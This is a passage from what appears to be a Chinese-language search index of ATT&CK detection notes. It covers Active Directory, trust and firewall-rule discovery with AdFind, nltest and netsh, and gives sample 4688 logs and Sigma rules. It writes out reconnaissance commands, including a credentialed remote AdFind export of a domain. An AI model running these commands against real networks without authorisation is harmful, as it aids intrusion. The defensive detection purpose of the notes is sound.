12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x10a4 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Users\\12306br0\\Desktop\\AdFind\\AdFind.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x69c \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: AdFind.exe -h 127.0.0.1","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_17","text":"\u5907\u6ce8\uff1a\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u68c0\u6d4b\u8be5\u5f02\u5e38\u884c\u4e3a\uff0c\u91cd\u70b9\u53ef\u5173\u6ce8Windows\u5b89\u5168\u65e5\u5fd7\u4e2d\u76844688\u30015158\u30015156\u30014689\u4e8b\u4ef6\uff0c\u5176\u4e2d\u8fdb\u7a0b\u4fe1\u606f\u3001\u76ee\u6807\u7aef\u53e3\uff08389\uff09\u53ef\u4f5c\u4e3a\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_18","text":"\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 192.168.1.1 -u test\\admin -up Password>all.txt \u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002","title":"\u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x04-nltest","text":"\u8bf4\u660e\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731935(v=ws.11)","title":"0x04 \u4f7f\u7528Nltest\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_19","text":"nltest [/\u57df\u63a7\u670d\u52a1\u5668\uff1a <servername>] [<operation> [<parameter>] /server\uff1a<ServerName>\u5728\u60a8\u6307\u5b9a\u7684\u8fdc\u7a0b\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884cnltest\u3002\u5982\u679c\u672a\u6307\u5b9a\u6b64\u53c2\u6570\uff0c\u5219nltest\u5728\u672c\u5730\u8ba1\u7b97\u673a\uff08\u5373\u57df\u63a7\u5236\u5668\uff09\u4e0a\u8fd0\u884c\u3002 \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u663e\u793a\u57df\u7684\u4fe1\u4efb\u5173\u7cfb\u4e0b\u9762\u7684\u793a\u4f8b\u5217\u51fa\u4e86\u4e3a\u60a8\u7684\u57df\u5efa\u7acb\u7684\u4fe1\u4efb\u5173\u7cfb\u3002 nltest /domain_trusts","title":"\u4f7f\u7528\u8bed\u6cd5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_20","text":"PS C:\\Users\\wangxin> nltest /domain_trusts \u57df\u4fe1\u4efb\u7684\u5217\u8868: 0: 361A 361a.com (NT 5) (Forest Tree Root) (Primary Domain) (Native) \u6b64\u547d\u4ee4\u6210\u529f\u5b8c\u6210","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_21","text":"#Windows\u5b89\u5168\u65e5\u5fd7\uff0c4688\u8fdb\u7a0b\u521b\u5efa\uff0cwindows server 2008 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 361A\\wangxin \u5e10\u6237\u540d: wangxin \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x23cb8 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa08 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\nltest.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x9e8","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_22","text":"\u5907\u6ce8\uff1a\u5efa\u8bae\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u4e2d\u7684\u8fdb\u7a0b\u4fe1\u606f\u8fdb\u884c\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_23","text":"MITRE-ATT&CK-T1482 https://attack.mitre.org/techniques/T1482/ \u6e17\u900f\u57fa\u7840\u2014\u2014\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u7684\u83b7\u53d62:Bypass AV https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%962_Bypass-AV","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/","text":"T1518-001-win-\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u5b89\u88c5\u5728\u7cfb\u7edf\u6216\u4e91\u73af\u5883\u4e2d\u7684\u5b89\u5168\u8f6f\u4ef6\uff0c\u914d\u7f6e\uff0c\u9632\u5fa1\u5de5\u5177\u548c\u4f20\u611f\u5668\u7684\u5217\u8868\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u8bf8\u5982\u9632\u706b\u5899\u89c4\u5219\u548c\u9632\u75c5\u6bd2\u4e4b\u7c7b\u7684\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u3002 \u53ef\u7528\u4e8e\u83b7\u5f97\u5b89\u5168\u8f6f\u4ef6\u7684\u4fe1\u606f\u4f8b\u5982\u547d\u4ee4\u7684netsh\uff0creg query\u4e0e\u6ce8\u518c\uff0cdir\u4e0eCMD\uff0c\u548c\u4efb\u52a1\u5217\u8868\uff0c\u4f46\u53d1\u73b0\u884c\u4e3a\u5176\u4ed6\u6307\u6807\u53ef\u4ee5\u662f\u66f4\u5177\u4f53\u7684\u8f6f\u4ef6\u6216\u5b89\u5168\u7cfb\u7edf\u7684\u653b\u51fb\u8005\u6b63\u5728\u5bfb\u627e\u7684\u7c7b\u578b\u3002\u770b\u5230macOS\u6076\u610f\u8f6f\u4ef6\u5bf9LittleSnitch\u548cKnockKnock\u8f6f\u4ef6\u6267\u884c\u68c0\u67e5\u5df2\u53d8\u5f97\u8d8a\u6765\u8d8a\u666e\u904d\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6839\u636eATT&CK\u5bf9T1063\u7684\u63cf\u8ff0\u4ee5\u53ca\u53c2\u8003\u5b9e\u4f8b\u3002\u6d4b\u8bd5\u5b9e\u4f8b\u201cNaikon\u4f7f\u7528\u547d\u4ee4netsh advfirewall firewall\u6765\u53d1\u73b0\u672c\u5730\u9632\u706b\u5899\u8bbe\u7f6e\u201d\uff0c\u6a21\u62df\u672c\u5730\u6267\u884c\u201cnetsh advfirewall firewall show rule name=all\u201d\u6765\u67e5\u770b\u672c\u5730\u9632\u706b\u5899\u89c4\u5219\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>netsh advfirewall firewall show rule name=all \u89c4\u5219\u540d\u79f0: \u7f51\u7edc\u53d1\u73b0(UPnP-In) ---------------------------------------------------------------------- \u5df2\u542f\u7528: \u662f \u65b9\u5411: \u5165 \u914d\u7f6e\u6587\u4ef6: \u4e13\u7528 \u5206\u7ec4: \u7f51\u7edc\u53d1\u73b0 \u672c\u5730 IP: \u4efb\u4f55 \u8fdc\u7a0b IP: \u4efb\u4f55 \u534f\u8bae: TCP \u672c\u5730\u7aef\u53e3: \u3000 2869 \u8fdc\u7a0b\u7aef\u53e3: \u3000 \u3000 \u4efb\u4f55 \u8fb9\u7f18\u904d\u5386: \u5426 \u64cd\u4f5c: \u5141\u8bb8 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows\u672c\u5730\u6267\u884cnetsh advfirewall firewall show rule name=all description: windows server 2016 references: \u6682\u65e0 tags: T1518-001 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\Windows\\System32\\netsh.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: netsh advfirewall firewall show rule name=all #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low \u5efa\u8bae \u5728\u9ad8\u7248\u672c\u7684Windows\u7cfb\u7edf\u4e2d\uff0c\u5b89\u5168\u8fd0\u8425\u4eba\u5458\u53ef\u6839\u636eWindows\u7248\u672c\u53ca\u5ba1\u6838\u9700\u8981\uff0c\u5f00\u542f\u7279\u5b9a\u7684windows\u5ba1\u6838\u7b56\u7565\u3002Windows\u9ad8\u672c\u7248\u5ba1\u6838\u7b56\u7565\u5f00\u542f\u540e\uff0c\u9ed8\u8ba4\u8bb0\u5f55\u5b9e\u7528\u7a0b\u5e8f\u6267\u884c\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u56e0\u6b64\u5728\u9ad8\u7248\u672c\u4e2d\uff0c\u53ef\u9488\u5bf9\u53c2\u6570\u547d\u4ee4\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002\u540c\u6837\uff0cmimikatz.exe\u4e5f\u53ef\u4ee5\u6839\u636emimikatz\u7279\u5b9a\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1518-001 https://attack.mitre.org/techniques/T1518/001","title":"T1518-001-win-\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#t1518-001-win-","text":"","title":"T1518-001-win-\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u5b89\u88c5\u5728\u7cfb\u7edf\u6216\u4e91\u73af\u5883\u4e2d\u7684\u5b89\u5168\u8f6f\u4ef6\uff0c\u914d\u7f6e\uff0c\u9632\u5fa1\u5de5\u5177\u548c\u4f20\u611f\u5668\u7684\u5217\u8868\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u8bf8\u5982\u9632\u706b\u5899\u89c4\u5219\u548c\u9632\u75c5\u6bd2\u4e4b\u7c7b\u7684\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u3002 \u53ef\u7528\u4e8e\u83b7\u5f97\u5b89\u5168\u8f6f\u4ef6\u7684\u4fe1\u606f\u4f8b\u5982\u547d\u4ee4\u7684netsh\uff0creg query\u4e0e\u6ce8\u518c\uff0cdir\u4e0eCMD\uff0c\u548c\u4efb\u52a1\u5217\u8868\uff0c\u4f46\u53d1\u73b0\u884c\u4e3a\u5176\u4ed6\u6307\u6807\u53ef\u4ee5\u662f\u66f4\u5177\u4f53\u7684\u8f6f\u4ef6\u6216\u5b89\u5168\u7cfb\u7edf\u7684\u653b\u51fb\u8005\u6b63\u5728\u5bfb\u627e\u7684\u7c7b\u578b\u3002\u770b\u5230macOS\u6076\u610f\u8f6f\u4ef6\u5bf9LittleSnitch\u548cKnockKnock\u8f6f\u4ef6\u6267\u884c\u68c0\u67e5\u5df2\u53d8\u5f97\u8d8a\u6765\u8d8a\u666e\u904d\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_1","text":"\u6839\u636eATT&CK\u5bf9T1063\u7684\u63cf\u8ff0\u4ee5\u53ca\u53c2\u8003\u5b9e\u4f8b\u3002\u6d4b\u8bd5\u5b9e\u4f8b\u201cNaikon\u4f7f\u7528\u547d\u4ee4netsh advfirewall firewall\u6765\u53d1\u73b0\u672c\u5730\u9632\u706b\u5899\u8bbe\u7f6e\u201d\uff0c\u6a21\u62df\u672c\u5730\u6267\u884c\u201cnetsh advfirewall firewall show rule name=all\u201d\u6765\u67e5\u770b\u672c\u5730\u9632\u706b\u5899\u89c4\u5219\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_3","text":"Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>netsh advfirewall firewall show rule name=all \u89c4\u5219\u540d\u79f0: \u7f51\u7edc\u53d1\u73b0(UPnP-In) ---------------------------------------------------------------------- \u5df2\u542f\u7528: \u662f \u65b9\u5411: \u5165 \u914d\u7f6e\u6587\u4ef6: \u4e13\u7528 \u5206\u7ec4: \u7f51\u7edc\u53d1\u73b0 \u672c\u5730 IP: \u4efb\u4f55 \u8fdc\u7a0b IP: \u4efb\u4f55 \u534f\u8bae: TCP \u672c\u5730\u7aef\u53e3: \u3000 2869 \u8fdc\u7a0b\u7aef\u53e3: \u3000 \u3000 \u4efb\u4f55 \u8fb9\u7f18\u904d\u5386: \u5426 \u64cd\u4f5c: \u5141\u8bb8","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_4","text":"windows\u5b89\u5168\u65e5\u5fd7\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows\u672c\u5730\u6267\u884cnetsh advfirewall firewall show rule name=all description: windows server 2016 references: \u6682\u65e0 tags: T1518-001 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\Windows\\System32\\netsh.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: netsh advfirewall firewall show rule name=all #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_6","text":"\u5728\u9ad8\u7248\u672c\u7684Windows\u7cfb\u7edf\u4e2d\uff0c\u5b89\u5168\u8fd0\u8425\u4eba\u5458\u53ef\u6839\u636eWindows\u7248\u672c\u53ca\u5ba1\u6838\u9700\u8981\uff0c\u5f00\u542f\u7279\u5b9a\u7684windows\u5ba1\u6838\u7b56\u7565\u3002Windows\u9ad8\u672c\u7248\u5ba1\u6838\u7b56\u7565\u5f00\u542f\u540e\uff0c\u9ed8\u8ba4\u8bb0\u5f55\u5b9e\u7528\u7a0b\u5e8f\u6267\u884c\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u56e0\u6b64\u5728\u9ad8\u7248\u672c\u4e2d\uff0c\u53ef\u9488\u5bf9\u53c2\u6570\u547d\u4ee4\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002\u540c\u6837\uff0cmimikatz.exe\u4e5f\u53ef\u4ee5\u6839\u636emimikatz\u7279\u5b9a\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1518-001 https://attack.mitre.org/techniques/T1518/001","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/","text":"T1518-win-\u8f6f\u4ef6\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u7cfb\u7edf\u4e0a\u5b89\u88c5\u7684\u975e\u5b89\u5168\u76f8\u5173\u8f6f\u4ef6\u7684\u5217\u8868\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u8f6f\u4ef6\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5236\u5b9a\u540e\u7eed\u884c\u4e3a\u8ba1\u5212\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0\uff0c\u6839\u636eMITRE ATT&CK\u77e9\u9635\u56fe\u4ecb\u7ecd\uff0c\u4f7f\u7528\u6b64\u6280\u6218\u672f\u7684\u7ec4\u7ec7\u8f83\u5c11\uff0c\u6545\u4e0d\u4f5c\u8be6\u7ec6\u6d4b\u8bd5\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0\u3002 \u68c0\u6d4b\u65e5\u5fd7 Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 \u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0 \u5efa\u8bae \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1518 https://attack.mitre.org/techniques/T1518/ MITRE-ATT&CK-T1057 https://attack.mitre.org/techniques/T1057/","title":"T1518-win-\u8f6f\u4ef6\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#t1518-win-","text":"","title":"T1518-win-\u8f6f\u4ef6\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u7cfb\u7edf\u4e0a\u5b89\u88c5\u7684\u975e\u5b89\u5168\u76f8\u5173\u8f6f\u4ef6\u7684\u5217\u8868\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u8f6f\u4ef6\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5236\u5b9a\u540e\u7eed\u884c\u4e3a\u8ba1\u5212\uff0c\u5305\u62ec\u653b